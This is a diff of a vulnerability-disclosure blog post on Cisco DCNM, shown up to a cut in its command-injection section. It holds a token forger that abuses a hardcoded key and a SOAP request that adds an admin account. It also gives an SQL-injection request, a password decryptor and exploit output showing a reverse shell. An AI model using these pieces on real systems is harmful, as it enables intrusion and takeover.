@@ -3,23 +3,20 @@ layout: post
 title: "Busting Cisco's Beans :: Hardcoding Your Way to Hell"
 date: 2020-01-14 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="Cisco Networking" src="/assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/cisco-logo.png">
-<p class="cn" markdown="1">After the somewhat dismay of reporting to Cisco some [other vulnerabilities](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) in their Prime Infrastructure product, I decided to perform an audit on the **Cisco Data Center Network Manager (DCNM) product**. What I found should not only **SHOCK** you, but relive that 90's remote root era that you all have been craving.</p>
+![Cisco Networking](/assets/images/busting-ciscos-beans/cisco-logo.png "Cisco Networking")
+
+After the somewhat dismay of reporting to Cisco some [other vulnerabilities](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) in their Prime Infrastructure product, I decided to perform an audit on the **Cisco Data Center Network Manager (DCNM) product**. What I found should not only **SHOCK** you, but relive that 90's remote root era that you all have been craving.
 <!--more-->
 
-<p class="cn">TL;DR</p>
+TL;DR; *In this post, I share three (3) full exploitation chains and multiple primitives that can be used to compromise different installations and setups of the Cisco DCNM product to achieve unauthenticated remote code execution as SYSTEM/root. In the third chain, I (ab)use the java.lang.InheritableThreadLocal class to perform a shallow copy to gain access to a valid session.*
 
-<p class="cn" markdown="1">*In this post, I share three (3) full exploitation chains and multiple primitives that can be used to compromise different installations and setups of the Cisco DCNM product to achieve unauthenticated remote code execution as SYSTEM/root. In the third chain, I (ab)use the java.lang.InheritableThreadLocal class to perform a shallow copy to gain access to a valid session.*</p>
+Before I begin, I would just like to say a huge **THANKYOU** to the [Zero Day Initiative](https://www.zerodayinitiative.com/) and [iDefense VCP Labs](https://vcp.idefense.com/login.jsf). Without their help in disclosing these vulnerabilities, I would have given up long ago.
 
-<p class="cn" markdown="1">Before I begin, I would just like to say a huge **THANKYOU** to the [Zero Day Initiative](https://www.zerodayinitiative.com/) and [iDefense VCP Labs](https://vcp.idefense.com/login.jsf). Without their help in disclosing these vulnerabilities, I would have given up long ago.</p>
 ## Table of Contents
 
-<p class="cn" markdown="1">Since this blog post is long I decided to break it up into sections. You can always jump to a particular section and jump back to the TOC.</p>
-
-<div markdown="1" class="cn">
+Since this blog post is long I decided to break it up into sections. You can always jump to a particular section and jump back to the TOC.
 
 - [Summary](#summary)
 - [Target Versions](#target-versions)
@@ -32,189 +29,84 @@ excerpt_separator: <!--more-->
 - [Conclusions](#conclusions)
 - [References](#references)
 
-</div>
-
 ## Summary
 
-<p class="cn" markdown="1">Before testing this application, a total of 14 vulnerabilities had been discovered according to cvedetails. This table doesn't include Pedro's [CVE-2019-1620](https://github.com/pedrib/PoC/blob/master/tracking.csv#L165) and [CVE-2019-1621](https://github.com/pedrib/PoC/blob/master/tracking.csv#L166).</p> 
+Before testing this application, a total of 14 vulnerabilities had been discovered according to cvedetails. This table doesn't include Pedro's [CVE-2019-1620](https://github.com/pedrib/PoC/blob/master/tracking.csv#L165) and [CVE-2019-1621](https://github.com/pedrib/PoC/blob/master/tracking.csv#L166).
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/total-vulns.png"
-            title="Total # of publically known vulnerabilities before testing"
-            caption="Total # of publically known vulnerabilities before testing"
-            style="width:80%;height:80%" %}
+![Total # of publically known vulnerabilities before testing](/assets/images/busting-ciscos-beans/total-vulns.png "Total # of publically known vulnerabilities before testing") 
 
-<p class="cn" markdown="1">Below you will find a table of the total number of *exploitable bugs I found in this audit:</p>
+Below you will find a table of the total number of *exploitable bugs I found in this audit:
 
-<div class="cn">
-  <table style="margin-bottom: 20px;padding: 20px;">
-    <colgroup>
-      <col style="width:60%" />
-      <col style="width:30%" />
-      <col style="width:30%" />
-    </colgroup>
-    <thead>
-      <tr class="header">
-        <th style="text-align:left">Bug class</th>
-        <th style="text-align:left">Number of findings</th>
-        <th style="text-align:right">Impact</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td markdown="span">Hardcoded Cryptographic Keys</td>
-        <td style="text-align:left" markdown="span">3</td>
-        <td style="text-align:right" markdown="span">AB*</td>
-      </tr>
-      <tr>
-        <td markdown="span">Hardcoded Credentials</td>
-        <td style="text-align:left" markdown="span">1</td>
-        <td style="text-align:right" markdown="span">ID</td>
-      </tr>
-      <tr>
-          <td markdown="span">Traversal File Read</td>
-          <td style="text-align:left" markdown="span">3</td>
-          <td style="text-align:right" markdown="span">ID*</td>
-      </tr>
-      <tr>
-          <td markdown="span">Arbitrary File Read</td>
-          <td style="text-align:left" markdown="span">2</td>
-          <td style="text-align:right" markdown="span">ID*</td>
-      </tr>
-      <tr>
-          <td markdown="span">External Enitity Injection</td>
-          <td style="text-align:left" markdown="span">4</td>
-          <td style="text-align:right" markdown="span">ID*</td>
-      </tr>
-      <tr>
-          <td markdown="span">SQL Injection - Time based blind</td>
-          <td style="text-align:left" markdown="span">11</td>
-          <td style="text-align:right" markdown="span">ID*</td>
-      </tr>
-      <tr>
-        <td markdown="span">SQL Injection - Stacked queries</td>
-        <td style="text-align:left" markdown="span">91</td>
-        <td style="text-align:right" markdown="span">RCE*</td>
-      </tr>
-      <tr>
-          <td markdown="span">Arbitrary SQL Execution</td>
-          <td style="text-align:left" markdown="span">1</td>
-          <td style="text-align:right" markdown="span">RCE*</td>
-      </tr>
-      <tr>
-        <td markdown="span">Command Injection</td>
-        <td style="text-align:left" markdown="span">2</td>
-        <td style="text-align:right" markdown="span">RCE*</td>
-      </tr>
-      <tr>
-          <td markdown="span">Traversal File Write</td>
-          <td style="text-align:left" markdown="span">7</td>
-          <td style="text-align:right" markdown="span">RCE*</td>
-      </tr>
-      <tr>
-          <td markdown="span">Traversal File Delete</td>
-          <td style="text-align:left" markdown="span">8</td>
-          <td style="text-align:right" markdown="span">DOS</td>
-      </tr>
-</tbody>
-</table>
-</div>
+| Bug class | Number of findings | Impact |
+|:----------|-------------------:|-------:|
+| Hardcoded Cryptographic Keys | 3 | AB* |
+| Hardcoded Credentials | 1 | ID |
+| Traversal File Read | 3 | ID* |
+| Arbitrary File Read | 2 | ID* |
+| External Enitity Injection | 4 | ID* |
+| SQL Injection - Time based blind | 11 | ID* |
+| SQL Injection - Stacked queries | 91 | RCE* |
+| Arbitrary SQL Execution | 1 | RCE* |
+| Command Injection | 2 | RCE* |
+| Traversal File Write | 7 | RCE* |
+| Traversal File Delete | 8 | DOS |
 
-<div class="cn">
-  <table style="margin-bottom: 20px;padding: 20px;">
-    <colgroup>
-      <col style="width:30%" />
-      <col style="width:50%" />
-      <col style="width:30%" />
-    </colgroup>
-    <thead>
-      <tr class="header">
-        <th style="text-align:left">Abbreviation</th>
-        <th style="text-align:left">Meaning</th>
-        <th style="text-align:right">Total found</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td style="text-align:left" markdown="span">AB</td>
-        <td style="text-align:left" markdown="span">Authentication Bypass</td>
-        <td style="text-align:right" markdown="span">3</td>
-      </tr>
-      <tr>
-        <td style="text-align:left" markdown="span">RCE</td>
-        <td style="text-align:left" markdown="span">Remote Code Execution</td>
-        <td style="text-align:right" markdown="span">101</td>
-      </tr>
-      <tr>
-        <td style="text-align:left" markdown="span">ID</td>
-        <td style="text-align:left" markdown="span">Information Disclosure</td>
-        <td style="text-align:right" markdown="span">21</td>
-      </tr>
-      <tr>
-        <td style="text-align:left" markdown="span">DOS</td>
-        <td style="text-align:left" markdown="span">Denial of Service</td>
-        <td style="text-align:right" markdown="span">8</td>
-      </tr>
-</tbody>
-</table>
-</div>
+| Abbreviation | Meaning | Total found |
+|:-------------|:--------|------------:|
+| AB | Authentication Bypass | 3 |
+| RCE | Remote Code Execution | 101 |
+| ID | Information Disclosure | 21 |
+| DOS | Denial of Service | 8 |
 
-<div markdown="1" class="cn">
+---
+
 - Exploitable meaning developer mistakes and/or my own laziness was not holding me back.
 - The AB vulnerabilities were complete (not partial), meaning an attacker could access everything.
 - The ID vulnerabilities could have been used to leak credentials and achieve remote code execution.
 - The RCE vulnerabilities had complete impact gaining access as either SYSTEM or root.
-</div>
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ## Target Versions
 
-<p class="cn" markdown="1">I tested two different setups of the product because some code paths and exploitation techniques were platform specific.</p>
+I tested two different setups of the product because some code paths and exploitation techniques were platform specific.
 
-<div markdown="1" class="cn">
 **Cisco DCNM 11.2.1 Installer for Windows (64-bit)**
   - Release: 11.2(1)
   - Release Date: 18-Jun-2019
   - FileName: dcnm-installer-x64-windows.11.2.1.exe.zip
   - Size: 1619.36 MB (1698022100 bytes)
   - MD5 Checksum: e50f8a6b2b3b014ec022fe40fabcb6d5 
-</div>
 
 ```bash
 C:\>ver
 Microsoft Windows [Version 6.3.9600]
 ```
 
-<div markdown="1" class="cn">
 **Cisco DCNM 11.2.1 ISO Virtual Appliance for VMWare, KVM and Bare-metal servers**
   - Release: 11.2(1)
   - Release Date: 05-Jun-2019
   - FileName: dcnm-va.11.2.1.iso.zip
   - Size: 4473.54 MB (4690850167 bytes)
   - MD5 Checksum: b1bba467035a8b41c63802ce8666b7bb 
-</div>
 
 ```bash
 [root@localhost ~]# uname -a
 Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-<p class="cn" markdown="1">All testing was performed on the latest version at the time.</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+All testing was performed on the latest version at the time.
+[ret2toc](#table-of-contents)
 
 ## RCE Chain 1
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
 ### SecurityManager getMessageDigest Authentication Bypass Vulnerability
 
-<p class="cn" markdown="1">Inside of the `com.cisco.dcbu.jaxws.handler.SecurityHandler` class we see:</p>
+Inside of the `com.cisco.dcbu.jaxws.handler.SecurityHandler` class we see:
 
 ```java
 /*     */ public class SecurityHandler
@@ -222,7 +114,7 @@ Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x
 /*     */ {
 ```
 
-<p class="cn" markdown="1">This class exposes a method called `handleInbound` which is an interceptor for all SOAP requests.</p>
+This class exposes a method called `handleInbound` which is an interceptor for all SOAP requests.
 
 ```java
 /*     */   protected boolean handleInbound(MessageContext msgContext) {
@@ -273,7 +165,7 @@ Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x
 /*     */           }
 ```
 
-<p class="cn" markdown="1">The code at line *[94]* we see a call to `SecurityHandler.hasSsoToken` which accepts a SOAP header that we can send in a SOAP request.</p>
+The code at line *[94]* we see a call to `SecurityHandler.hasSsoToken` which accepts a SOAP header that we can send in a SOAP request.
 
 ```java
 /*     */   protected boolean hasSsoToken(SOAPHeader header) {
@@ -308,7 +200,7 @@ Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x
 /*     */   }
 ```
 
-<p class="cn" markdown="1">The code at line *[183]* will check for a `ssoToken` header and if it exists, extract the value and parse it to `SecurityManager.confirmSSOToken` method on line *[186]*. Let's investigate that method.</p>
+The code at line *[183]* will check for a `ssoToken` header and if it exists, extract the value and parse it to `SecurityManager.confirmSSOToken` method on line *[186]*. Let's investigate that method.
 
 ```java
 /*     */   public static boolean confirmSSOToken(String ssoToken) {
@@ -343,7 +235,7 @@ Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x
 /*     */   }
 ```
 
-<p class="cn" markdown="1">We see a check at line *[465]* that if the extracted `digest` matches the resultant call from `SecurityManager.getMessageDigest` then the code will reach line *[466]* and set `ret` to true which is later returned. Let's now investigate the `SecurityManager.getMessageDigest` method.</p>
+We see a check at line *[465]* that if the extracted `digest` matches the resultant call from `SecurityManager.getMessageDigest` then the code will reach line *[466]* and set `ret` to true which is later returned. Let's now investigate the `SecurityManager.getMessageDigest` method.
 
 ```java
 /*     */   private static String getMessageDigest(String algorithm, String userName, int sessionid, long sysTime) throws Exception {
@@ -359,11 +251,11 @@ Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x
 /*     */   }
 ```
 
-<p class="cn" markdown="1">We can see whats happening, we can control all the elements to forge our own token and then a hardcoded key is used to generate the `ssoToken`, meaning that we can bypass authentication. If this looks familiar to you, then you are probably thinking of [CVE-2019-1619](https://github.com/pedrib/PoC/blob/master/advisories/cisco-dcnm-rce.txt#L42) which Pedro found.</p>
+We can see whats happening, we can control all the elements to forge our own token and then a hardcoded key is used to generate the `ssoToken`, meaning that we can bypass authentication. If this looks familiar to you, then you are probably thinking of [CVE-2019-1619](https://github.com/pedrib/PoC/blob/master/advisories/cisco-dcnm-rce.txt#L42) which Pedro found.
 
-<p class="cn" markdown="1">Here is the code I used to generate the sso token.</p>
+Here is the code I used to generate the sso token.
 
-```python
+```py
 import md5
 import base64
 def gen_ssotoken():
@@ -374,7 +266,7 @@ def gen_ssotoken():
     return "%d.%d.%s.%s" % (sessionid, timestamp, base64.b64encode(md5.new(d).digest()), username)
 ```
 
-<p class="cn" markdown="1">Using this bug, we can send a SOAP request to the `/DbAdminWSService/DbAdminWS` endpoint and add a global admin user that will give us access to all interfaces!</p>
+Using this bug, we can send a SOAP request to the `/DbAdminWSService/DbAdminWS` endpoint and add a global admin user that will give us access to all interfaces!
 
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
@@ -392,11 +284,11 @@ def gen_ssotoken():
 </soapenv:Envelope>
 ```
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ### HostEnclHandler getVmHostData SQL Injection Remote Code Execution Vulnerability
 
-<p class="cn" markdown="1">Inside of the `com.cisco.dcbu.jaxws.san.ep.DbInventoryWS` class we see the following code.</p>
+Inside of the `com.cisco.dcbu.jaxws.san.ep.DbInventoryWS` class we see the following code.
 
 ```java
 /*      */ @Remote({DbInventorySEI.class})
@@ -430,9 +322,9 @@ def gen_ssotoken():
 /*      */   }
 ```
 
-<p class="cn" markdown="1">The annotations at the top of the method indicate that we can reach this method through web services. At line *[610]* we can reach a call to the `HostEnclHandler.getVmHostData` method with an attacker supplied `dbFilter`.</p>
+The annotations at the top of the method indicate that we can reach this method through web services. At line *[610]* we can reach a call to the `HostEnclHandler.getVmHostData` method with an attacker supplied `dbFilter`.
 
-<p class="cn" markdown="1">But before we get to that method, let's take a moment to see investigate the `com.cisco.dcbu.jaxws.wo.DbFilterDO` class. This is a Object datatype that the `HostEnclHandler.getVmHostData` method is expecting.</p>
+But before we get to that method, let's take a moment to see investigate the `com.cisco.dcbu.jaxws.wo.DbFilterDO` class. This is a Object datatype that the `HostEnclHandler.getVmHostData` method is expecting.
 
 ```java
 /*     */ @XmlType(name = "DbFilter")
@@ -459,11 +351,11 @@ def gen_ssotoken():
 /*     */   private String qryStr;
 ```
 
-<p class="cn" markdown="1">Cisco DCNM uses the [JAXB](https://en.wikipedia.org/wiki/Java_Architecture_for_XML_Binding) marshaller which performs [ORM](https://en.wikipedia.org/wiki/Object-relational_mapping) between XML data structures.</p>
+Cisco DCNM uses the [JAXB](https://en.wikipedia.org/wiki/Java_Architecture_for_XML_Binding) marshaller which performs [ORM](https://en.wikipedia.org/wiki/Object-relational_mapping) between XML data structures.
 
-<p class="cn" markdown="1">`DbFilterDO` more specifically, is a type of [EJB](https://en.wikipedia.org/wiki/Enterprise_JavaBeans) known as an [entity bean](https://en.wikipedia.org/wiki/Entity_Bean). This bean has a type name of `DbFilter` and it's accessor type is set to `XmlAccessType.FIELD`, meaning that every underlying field and annotated property is marshalled.</p>
+`DbFilterDO` more specifically, is a type of [EJB](https://en.wikipedia.org/wiki/Enterprise_JavaBeans) known as an [entity bean](https://en.wikipedia.org/wiki/Entity_Bean). This bean has a type name of `DbFilter` and it's accessor type is set to `XmlAccessType.FIELD`, meaning that every underlying field and annotated property is marshalled.
 
-<p class="cn" markdown="1">Knowing that we can set the fields on this object, let's continue with the `HostEnclHandler.getVmHostData` method definition.</p>
+Knowing that we can set the fields on this object, let's continue with the `HostEnclHandler.getVmHostData` method definition.
 
 ```java
 /*      */   public ArrayList<VmDO> getVmHostData(DbFilterDO dbFilter, int startIdx, int recordSize, boolean isHost, Map<Long, String> _vmUsageMap, Map<Long, List<VmDO>> _Host2vmHash) {
@@ -482,9 +374,9 @@ def gen_ssotoken():
 /*      */     } 
 ```
 
-<p class="cn" markdown="1">At line *[1064]* we can see the `sortField` of our `dbFilter` object is accessed and used as an index to the `this._Name2SqlHash` hashmap. Also, the `sortType` is appended afterwards and stores this all in the `sortSqlSuffix` variable.</p>
+At line *[1064]* we can see the `sortField` of our `dbFilter` object is accessed and used as an index to the `this._Name2SqlHash` hashmap. Also, the `sortType` is appended afterwards and stores this all in the `sortSqlSuffix` variable.
 
-<p class="cn" markdown="1">Let's check the definition of the `this._Name2SqlHash` variable.</p>
+Let's check the definition of the `this._Name2SqlHash` variable.
 
 ```java
 
@@ -521,9 +413,9 @@ def gen_ssotoken():
 /*      */   }
 ```
 
-<p class="cn" markdown="1">For exploitation, I decided to set the `sortField` to the `vcluster` index on line *[3612]*. This will ensure we don't trigger an `java.lang.IndexOutOfBoundsException` exception on the `this._Name2SqlHash` hashmap.</p>
+For exploitation, I decided to set the `sortField` to the `vcluster` index on line *[3612]*. This will ensure we don't trigger an `java.lang.IndexOutOfBoundsException` exception on the `this._Name2SqlHash` hashmap.
 
-<p class="cn" markdown="1">Continuing along inside of the `HostEnclHandler.getVmHostData` method, we can be sure that we can influence the `sortSqlSuffix` variable.</p>
+Continuing along inside of the `HostEnclHandler.getVmHostData` method, we can be sure that we can influence the `sortSqlSuffix` variable.
 
 ```java
 /* 1068 */     con = null;
@@ -546,25 +438,21 @@ def gen_ssotoken():
 /* 1085 */       rs = SQLLoader.execute(stmt);
 ```
 
-<p class="cn" markdown="1">On line *[1079]* we can see a prepared sql statement is being created in an unsafe way using our injected `sortSqlSuffix` variable. Then on line *[1085]* the sql injection is actually triggered!</p>
+On line *[1079]* we can see a prepared sql statement is being created in an unsafe way using our injected `sortSqlSuffix` variable. Then on line *[1085]* the sql injection is actually triggered!
 
-<p class="cn" markdown="1">*Side note: This bug was a result of a design flaw and patterned numerous times where the developer(s) made the assumption that since the queries where parameterized, they were safe from sql injection. Further searches of this pattern resulted in over 100 separate sql injection vulnerabilities alone.*</p>
+*Side note: This bug was a result of a design flaw and patterned numerous times where the developer(s) made the assumption that since the queries where parameterized, they were safe from sql injection. Further searches of this pattern resulted in over 100 separate sql injection vulnerabilities alone.*
 
-<p class="cn" markdown="1">The next step was to discover the exact SOAP parameters needed to trigger this code path. The `WebContext` annotation gives us a url pattern that will reveal the [wsdl](https://en.wikipedia.org/wiki/Web_Services_Description_Language) path to be `https://<target>/DbInventoryWSService/DbInventoryWS?wsdl`</p>
+The next step was to discover the exact SOAP parameters needed to trigger this code path. The `WebContext` annotation gives us a url pattern that will reveal the [wsdl](https://en.wikipedia.org/wiki/Web_Services_Description_Language) path to be `https://<target>/DbInventoryWSService/DbInventoryWS?wsdl`
 
-<p class="cn" markdown="1">For reference, here is the `WebContext` annotation.</p>
+For reference, here is the `WebContext` annotation.
 
 ```java
 /*      */ @WebContext(contextRoot = "/DbInventoryWSService", urlPattern = "/DbInventoryWS")
 ```
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/wsdl.png"
-            title="Revealing the getVmHostData method service descriptor"
-            caption="Revealing the getVmHostData method service descriptor"
-            style="width:60%;height:60%" %}
+![Revealing the getVmHostData method service descriptor](/assets/images/busting-ciscos-beans/wsdl.png "Revealing the getVmHostData method service descriptor") 
 
-<p class="cn" markdown="1">Combining the first vulnerability we could send the following request that populates the properties in the `dbFilter` to the `/DbInventoryWSService/DbInventoryWS` SOAP endpoint and trigger the SQL Injection.</p>
+Combining the first vulnerability we could send the following request that populates the properties in the `dbFilter` to the `/DbInventoryWSService/DbInventoryWS` SOAP endpoint and trigger the SQL Injection.
 
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
@@ -585,7 +473,7 @@ def gen_ssotoken():
 </soapenv:Envelope>
 ```
 
-<p class="cn" markdown="1">The SQL Injection is running as user `dcnmuser`.</p>
+The SQL Injection is running as user `dcnmuser`.
 
 ```bash
 root@localhost ~]# psql -U dcnmuser dcmdb
@@ -612,61 +500,61 @@ dcmdb=> select distinct privilege_type FROM information_schema.role_table_grants
 (7 rows)
 ```
 
-<p class="cn" markdown="1">Checking the database permissions, we can see that we have limited privileges and we can't use commands such as `copy` or `lo_import` to read/write to the filesystem. However, after some investigation, I found several ways to achieve remote code execution. Please see the [SQLi2RCE Primitives](#sqli2rce-primitives) section for details on some of the ways.</p>
+Checking the database permissions, we can see that we have limited privileges and we can't use commands such as `copy` or `lo_import` to read/write to the filesystem. However, after some investigation, I found several ways to achieve remote code execution. Please see the [SQLi2RCE Primitives](#sqli2rce-primitives) section for details on some of the ways.
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/chain-1.png"
-            title="Gaining SYSTEM with many SQL Injections"
-            caption="Gaining SYSTEM with many SQL Injections"
-            style="width:80%;height:80%" %}
+```
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback>
+(+) eg: ./poc.py 192.168.100.122 192.168.100.59:1337
 
-<p markdown="1" class="cn">You can [download](/pocs/cve-2019-15976.py.txt) the exploit and test it for yourself.</p>
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+saturn:~ mr_me$ ./poc.py 192.168.100.122 192.168.100.59:1337
+(+) created the account hacker:Hacked123
+(+) created the 1337/custom path!
+(+) leaked vfs! temp230cf31722794196/content-ed98b5003b1c695c
+(+) SQL Injection working!
+(+) wrote the si.jsp shell!
+(+) cleaned up the database!
+(+) starting handler on port 1337
+(+) connection from 192.168.100.122
+(+) pop thy shell!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>whoami
+whoami
+nt authority\system
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>
+```
+
+You can [download](/pocs/cve-2019-15976.py.txt) the exploit and test it for yourself.
+[ret2toc](#table-of-contents)
 
 ## RCE Chain 2
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
 ### Server Debug Port Hardcoded Account Information Disclosure Vulnerability
 
-<p markdown="1" class="cn">Admittedly I don't know where the exact vulnerable code is for this vulnerability, but I will share with you the process of discovery.</p>
+Admittedly I don't know where the exact vulnerable code is for this vulnerability, but I will share with you the process of discovery.
+When performing some blackbox testing (whilst code reviewing) I came across this web application.
 
-<p markdown="1" class="cn">When performing some blackbox testing (whilst code reviewing) I came across this web application.</p>
+![Authentication for the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo.png "Authentication for the /serverinfo/ web application")
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/serverinfo.png"
-            title="Authentication for the /serverinfo/ web application"
-            caption="Authentication for the /serverinfo/ web application"
-            style="width:70%;height:70%" %}
+I didn't know what the password was at the time, so I decided to do some searching, which lead me to [this](https://community.emc.com/docs/DOC-64136) blog post:
 
-<p markdown="1" class="cn">I didn't know what the password was at the time, so I decided to do some searching, which lead me to [this](https://community.emc.com/docs/DOC-64136) blog post:</p>
+![Finding the hardcoded credentials to the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo-creds.png "Finding the hardcoded credentials to the /serverinfo/ web application")
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/serverinfo-creds.png"
-            title="Finding the hardcoded credentials to the /serverinfo/ web application"
-            caption="Finding the hardcoded credentials to the /serverinfo/ web application"
-            style="width:70%;height:70%" %}
+This worked! I could now login and look around.
 
-<p markdown="1" class="cn">This worked! I could now login and look around.</p>
+![Logging on to the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo-login.png "Logging on to the /serverinfo/ web application")
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/serverinfo-login.png"
-            title="Logging on to the /serverinfo/ web application"
-            caption="Logging on to the /serverinfo/ web application"
-            style="width:60%;height:60%" %}
+The most interesting information disclosure was the `sftp` username and encrypted password, which was only available on the appliance.
 
-<p markdown="1" class="cn">The most interesting information disclosure was the `sftp` username and encrypted password, which was only available on the appliance.</p>
+![Disclosure of the encrypted sftp password](/assets/images/busting-ciscos-beans/serverinfo-disclosure.png "Disclosure of the encrypted sftp password")
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/serverinfo-disclosure.png"
-            title="Disclosure of the encrypted sftp password"
-            caption="Disclosure of the encrypted sftp password"
-            style="width:50%;height:50%" %}
-
-<p markdown="1" class="cn">When auditing I bundle all class files and their package paths into a single directory. Searching for the password in this folder returned many results and it was hard to pinpoint exactly which class was at fault. I still have my suspicions on the `com.cisco.dcbu.sm.common.registry.ContextRegistry` class but cross referencing that was a nightmare.</p>
+When auditing I bundle all class files and their package paths into a single directory. Searching for the password in this folder returned many results and it was hard to pinpoint exactly which class was at fault. I still have my suspicions on the `com.cisco.dcbu.sm.common.registry.ContextRegistry` class but cross referencing that was a nightmare.
 
 ```bash
 saturn:all mr_me$ grep -ir "nbv_12345" .
@@ -700,17 +588,16 @@ Binary file ./com/cisco/dcbu/lib/mds/zm/MDSXMLZoneCommandHandler.class matches
 Binary file ./com/cisco/dcbu/lib/mds/zm/WebZoneDataModCache.class matches
 ```
 
-<p markdown="1" class="cn">The root password is stored in the `server.properties` file and is displayed in the `/serverinfo/` web application. During installation, the administrator sets the root password and the installer calls `appmgr add_user dcnm -u root -p <password> -db <dcnm-db-password>` which then executes the `/usr/local/cisco/dcm/fm/bin/addUser.sh` script.</p>
+The root password is stored in the `server.properties` file and is displayed in the `/serverinfo/` web application. During installation, the administrator sets the root password and the installer calls `appmgr add_user dcnm -u root -p <password> -db <dcnm-db-password>` which then executes the `/usr/local/cisco/dcm/fm/bin/addUser.sh` script.
 
-<p markdown="1" class="cn">The `/usr/local/cisco/dcm/fm/bin/addUser.sh` script launches the `com.cisco.dcbu.install.UserUtil` class to add that user to the `server.properties` file.</p>
+The `/usr/local/cisco/dcm/fm/bin/addUser.sh` script launches the `com.cisco.dcbu.install.UserUtil` class to add that user to the `server.properties` file.
 
-<p markdown="1" class="cn">We are left with one small hurdle, *how are we going to decrypt the password?*</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+We are left with one small hurdle, *how are we going to decrypt the password?*
+[ret2toc](#table-of-contents)
 
 ### JBoss_4_2Encrypter Hardcoded Encryption Key Information Disclosure Vulnerability
 
-<p markdown="1" class="cn">Inside of the `com.cisco.dcbu.lib.util.jboss_4_2.JBoss_4_2Encrypter` class, we can find the following code:</p>
+Inside of the `com.cisco.dcbu.lib.util.jboss_4_2.JBoss_4_2Encrypter` class, we can find the following code:
 
 ```java
 /*    */ public class JBoss_4_2Encrypter
@@ -748,9 +635,9 @@ Binary file ./com/cisco/dcbu/lib/mds/zm/WebZoneDataModCache.class matches
 /*    */ }
 ```
 
-<p markdown="1" class="cn">On line *[39]* the code encrypts these passwords using the `jaas is the way` key. Yes, Cisco, jaas is the way.</p>
+On line *[39]* the code encrypts these passwords using the `jaas is the way` key. Yes, Cisco, jaas is the way.
 
-```python
+```py
 #!/usr/bin/python
 import sys
 from Crypto.Cipher import Blowfish
@@ -763,15 +650,13 @@ saturn:~ mr_me$ ./poc.py 59f44e08047be2d72f34371127b18a0b
 Dcnmpass123
 ```
 
-<p markdown="1" class="cn">With this, we can now login to the DCNM web interface as the root user with `network-admin` privileges, which is enough for a complete authentication bypass.</p>
-
-<p markdown="1" class="cn">We can also login to the SSH server as root but we don't talk about that default misconfiguration and instead assume the SSH server is locked down. :-)</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+With this, we can now login to the DCNM web interface as the root user with `network-admin` privileges, which is enough for a complete authentication bypass.
+We can also login to the SSH server as root but we don't talk about that default misconfiguration and instead assume the SSH server is locked down. :-)
+[ret2toc](#table-of-contents)
 
 ### LanFabricImpl createLanFabric Command Injection Remote Code Execution Vulnerability
 
-<p markdown="1" class="cn">Inside of the `com.cisco.dcbu.vinci.rest.services.LanFabrics` class we can find the `createLanFabric` rest method.</p>
+Inside of the `com.cisco.dcbu.vinci.rest.services.LanFabrics` class we can find the `createLanFabric` rest method.
 
 ```java
 /*     */ @Path("/fabrics")
@@ -803,7 +688,7 @@ Dcnmpass123
 /*     */   }
 ```
 
-<p markdown="1" class="cn">At line *[54]* we can call the `LanFabricImpl.createLanFabric` method with a controlled `com.cisco.dcbu.vinci.rest.resources.fabric.LanFabricSetting` entity bean called `fabric`.</p>
